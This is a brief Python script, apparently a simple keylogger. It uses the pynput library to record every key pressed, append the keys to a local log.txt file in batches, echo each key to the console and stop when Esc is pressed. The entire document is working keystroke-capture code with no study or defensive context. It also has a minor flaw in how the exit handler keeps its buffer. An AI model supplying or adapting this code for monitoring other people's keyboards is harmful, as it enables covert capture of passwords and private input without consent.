from pynput.keyboard import Key, Listener
import atexit

def save(ls):
    try:
        with open("log.txt","a"):
            pass
    except FileNotFoundError:
        with open("log.txt","w+"):
            pass
    finally:
        with open("log.txt","a") as file:
            file.write("".join([str(m) for m in ls]))
ls = []
atexit.register(save,ls)

def on_press(key):
    global ls
    ls.append(key)
    if len(ls) > 5:
        save(ls)
        ls = []
    print(f"{key} pressed,{len(ls)}")

def on_release(key):
    if key == Key.esc:
        return False
    
with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()
